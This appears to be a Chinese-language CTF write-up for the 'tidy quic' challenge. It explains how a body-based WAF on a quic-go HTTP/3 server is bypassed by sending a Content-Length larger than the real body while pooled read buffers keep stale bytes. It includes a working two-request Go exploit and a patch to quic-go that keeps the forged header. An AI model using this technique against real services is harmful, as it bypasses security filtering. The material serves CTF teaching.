# tidy quic

## 题目简述

题目目标是绕过基于请求体内容的 WAF。服务端使用 HTTP/3 / QUIC 相关栈读取请求体，并复用缓冲池。关键异常有两个：`http.Request.ContentLength` 取值可被构造得大于实际请求体长度；从缓冲池取出的缓冲区未清零。两者叠加后，旧请求残留字节可以污染下一次请求体读取结果。

## 解题过程

注意到两个现象

1. 每次读取的请求体长度取决于 `http.Request` 的 `ContentLength` 字段而非实际长度。经过审计发现，quic-go 的 `http.Request` 结构体中 `ContentLength` 字段与 Go 标准实现对该字段的定义有差距，其值取决于 HTTP 报文中的 `ContentLength`，而不是实际长度。事实上 HTTP/3 已经用更好的结构化方式指定准确内容长度，而不是依赖 `ContentLength` 头；这个头大概率是可选的，不该被解析。虽然这里有有限校验，但仍有办法让 `ContentLength` 字段的值大于实际报文中请求体的长度。

2. 程序使用缓冲池管理缓冲区，从缓冲池获取用于读取请求体的缓冲区后没有清零。

结合这两点，可以利用脏缓冲区向读取到的请求体内容末尾添加一些字节，从而绕过 WAF 限制。

```go
package main
import (
    "bytes"
    "crypto/tls"
    "fmt"
    "github.com/quic-go/quic-go/http3"
    "io"
    "net/http"
    "testing"
)
const url = "https://target:port"
func TestReq(t *testing.T) {
    rt := &http3.RoundTripper{TLSClientConfig: &tls.Config{
       InsecureSkipVerify: true,
    }}
    req, err := http.NewRequest("POST", url, bytes.NewReader([]byte("I want 00ag     ")))
    if err != nil {
       panic(err)
    }
    req.Header = http.Header{
       "Host":           []string{"localhost"},
       "Content-Length": []string{"16"},
       "User-Agent":     []string{"curl/7.64.1"},
    }
    resp, err := rt.RoundTrip(req)
    if err != nil {
       fmt.Println(resp, err)
       return
    }
    data, err := io.ReadAll(resp.Body)
    if err != nil {
       fmt.Println(string(data))
       return
    }
    req, err = http.NewRequest("POST", url, bytes.NewReader([]byte("I want fl")))
    if err != nil {
       panic(err)
    }
    req.Header = http.Header{
       "Host":           []string{"localhost"},
       "Content-Length": []string{"16"},
       "User-Agent":     []string{"curl/7.64.1"},
    }
    resp, err = rt.RoundTrip(req)
    fmt.Println(resp, err)
    data, _ = io.ReadAll(resp.Body)
    fmt.Println(string(data))
}
```

在上文中，我们利用脏缓冲区预填充了 `ag` 两个字符。处理第二个请求时，服务端读取后会拼接出 `flag` 字样；同时利用脚本选择相同的 `Content-Length`，以保证两个请求从 go-buffer-pool 的同一类池子里获取缓冲区。

由于 quic-go 会在发送时修正 `Content-Length` 字段的值，所以这段利用脚本需要使用一个修改后的 quic-go，即注释掉 `http3/request_writer.go` 中的下面几行代码：

```go
if shouldSendReqContentLength(req.Method, contentLength) {
    f("content-length", strconv.FormatInt(contentLength, 10))
}
```

选手也可以采用其他方式构造并发送这个 HTTP/3 报文。

## 方法总结

- 核心技巧：利用 `Content-Length` 与实际请求体长度不一致，以及缓冲池未清零造成的脏数据复用，把上一请求残留字节拼到下一请求请求体尾部。
- 识别信号：HTTP/3、QUIC、自定义请求读取逻辑和缓冲池同时出现时，应检查长度字段是否来自可控请求头，以及复用缓冲区是否清零。
- 复用要点：两次请求要落入同一类缓冲池；第一包负责预填充目标后缀，第二包只发送 WAF 允许的前缀，服务端读取时拼出被拦截关键词。
